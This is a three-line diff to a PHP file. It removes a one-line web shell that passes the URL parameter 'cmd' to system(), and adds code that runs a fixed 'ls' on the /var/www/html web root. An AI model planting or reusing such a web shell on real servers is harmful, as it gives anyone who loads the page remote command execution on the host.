@@ -1,1 +1,3 @@
-<?php system($_GET['cmd'])?>
+<?php 
+system("ls /var/www/html/");
+?>
